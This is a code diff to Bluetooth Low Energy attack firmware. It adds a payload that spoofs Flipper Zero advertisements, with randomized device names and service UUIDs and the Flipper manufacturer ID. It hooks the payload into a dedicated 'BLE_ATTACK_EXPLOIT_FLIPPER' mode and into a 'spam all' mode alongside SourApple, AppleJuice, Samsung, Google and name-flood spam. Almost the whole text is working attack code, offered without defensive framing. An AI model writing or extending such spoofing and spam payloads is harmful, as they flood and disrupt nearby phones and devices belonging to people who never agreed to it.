@@ -237,6 +237,52 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
             AdvData.addData(AdvData_Raw, 12 + name_len);
             break;
         }
+        case Flipper: {
+            char Name[6];  // 5 characters + null terminator
+            strcpy(Name, generateRandomName().c_str());
+
+            uint8_t name_len = strlen(Name);
+
+            // Allocate space for the full Advertisement Data section based on the hex dump
+            AdvData_Raw = new uint8_t[31];  // Adjusted to the specific length of the data in the dump
+
+            // Advertisement Data from the hex dump
+            AdvData_Raw[i++] = 0x02;  // Flags length
+            AdvData_Raw[i++] = 0x01;  // Flags type
+            AdvData_Raw[i++] = 0x06;  // Flags value
+
+            AdvData_Raw[i++] = 0x06;  // Name length (5 + type)
+            AdvData_Raw[i++] = 0x09;  // Complete Local Name type
+
+            // Add the randomized 5-letter name
+            memcpy(&AdvData_Raw[i], Name, name_len);
+            i += name_len;
+
+            AdvData_Raw[i++] = 0x03;  // Incomplete List of 16-bit Service UUIDs length
+            AdvData_Raw[i++] = 0x02;  // Incomplete List of 16-bit Service UUIDs type
+            AdvData_Raw[i++] = 0x80 + (rand() % 3) + 1;   // Service UUID (part of hex dump)
+            AdvData_Raw[i++] = 0x30;
+
+            AdvData_Raw[i++] = 0x02;  // TX Power level length
+            AdvData_Raw[i++] = 0x0A;  // TX Power level type
+            AdvData_Raw[i++] = 0x00;  // TX Power level value
+
+            // Manufacturer specific data based on your hex dump
+            AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
+            AdvData_Raw[i++] = 0xFF;  // Manufacturer Specific Data type
+            AdvData_Raw[i++] = 0xBA;  // LSB of Manufacturer ID (Flipper Zero: 0x0FBA)
+            AdvData_Raw[i++] = 0x0F;  // MSB of Manufacturer ID
+
+            AdvData_Raw[i++] = 0x4C;  // Example data (remaining as in your dump)
+            AdvData_Raw[i++] = 0x75;
+            AdvData_Raw[i++] = 0x67;
+            AdvData_Raw[i++] = 0x26;
+            AdvData_Raw[i++] = 0xE1;
+            AdvData_Raw[i++] = 0x80;
+
+            AdvData.addData(AdvData_Raw, i);
+            break;
+        }
         default: {
             Serial.println("[WARN] Choose Company Type!");
             return AdvData; // Return empty data for default case
@@ -325,6 +371,10 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(NameFlood);
         AdvertisedPacketCount++;
     }
+    else if (mode == BLE_ATTACK_EXPLOIT_FLIPPER) {
+        executeSwiftpair(Flipper);
+        AdvertisedPacketCount++;
+    }
     else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
         executeSwiftpair(SourApple, true);
         executeSwiftpair(AppleJuice, true);
@@ -332,6 +382,7 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(Samsung, true);
         executeSwiftpair(Google, true);
         executeSwiftpair(NameFlood, true);
+        executeSwiftpair(Flipper, true);
         AdvertisedPacketCount++;
     }
     else if (mode == BLE_ATTACK_SPOOFER_INIT)
